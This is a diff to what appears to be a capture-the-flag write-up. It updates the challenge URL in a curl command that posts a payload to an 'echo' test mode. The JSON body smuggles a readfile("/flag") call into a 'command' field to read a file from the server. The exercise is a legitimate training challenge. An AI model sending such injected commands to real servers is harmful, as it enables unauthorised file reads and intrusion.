@@ -84,7 +84,7 @@ Create the payload:
 
 Send the malicious payload to the echo test mode:
 ```bash
-curl "http://ctf.dscjssstuniv.in:8070/?test=echo" \
+curl "https://echochamber.challenges1.ctf.dscjssstuniv.in/?test=echo" \
      -X POST \
      -H "Content-Type: application/json" \
      -d '{"signal":"Echo","command":"readfile(\"/flag\");"}'
